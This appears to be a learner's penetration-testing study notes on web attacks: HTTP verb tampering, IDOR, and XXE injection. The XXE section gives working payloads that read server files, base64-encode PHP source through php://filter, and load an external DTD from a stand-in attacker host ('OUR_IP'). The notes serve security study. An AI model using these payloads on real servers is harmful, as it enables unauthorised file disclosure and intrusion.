# Web Attacks
## HTTP Verb Tampering
- The HTTP protocol works by accepting various HTTP methods as verbs at the beginning of an HTTP request. Depending on the web server configuration, web applications may be scripted to accept certain HTTP methods for their various functionalities and perform a particular action based on the type of the request.
- Verbs include: GET, POST, HEAD, PUT, HEAD, PATCH, OPTIONS, DELETE
- Right click --> change request method in burp
- OPTIONS should send back all allowable verbs
- Some web apps only filter/allow list certain verbs, but HEAD acts very similar to GET but has no response in the body.

## IDOR
- Insecure Direct Object References (IDOR) vulnerabilities are among the most common web vulnerabilities and can significantly impact the vulnerable web application. IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. If any user can access any resource due to the lack of a solid access control system, the system is considered to be vulnerable.

- Reminder: Hashes are one way

## Bypassing encoded references
- We might not be able to update/post a users details but can we see them with a GET request?
- In addition to allowing us to view potentially sensitive details, the ability to modify another user's details also enables us to perform several other attacks. One type of attack is modifying a user's email address.
- Another potential attack is placing an XSS payload in the 'about' field, which would get executed once the user visits their Edit profile page, enabling us to attack the user in different ways.

## Intro to XXE
XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down, which is why it is considered one of the Top 10 Web Security Risks by OWASP.
- Extensible Markup Language (XML)
- XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure.
- A DTD can be placed in the file, referenced from a file (its stored separately), or accessib le via URL.
- We can sometimes reference external XML entities with trhe SYSTEM keyword. Or we may also use the PUBLIC keyword instead of SYSTEM for loading external resources, which is used with publicly declared entities and standards, such as a language code (lang="en").

## Local file disclosure
- The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input.
- **Note**: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an online tool. If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.
- the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity. If a file contains some of XML's special characters (e.g. </>/&), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format.

Luckily, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format. To do so, instead of using file:// as our reference, we will use PHP's php://filter/ wrapper. With this filter, we can specify the convert.base64-encode encoder as our filter, and then add an input resource (e.g. resource=index.php), as follows:
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
To output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag (e.g. <![CDATA[ FILE_CONTENT ]]>). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters. fancy way of defining it in the DTD:
```
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
Reference an external DTD (one you're locally hosting): 
```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
```
**Note**: In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop), as mentioned in the previous section.

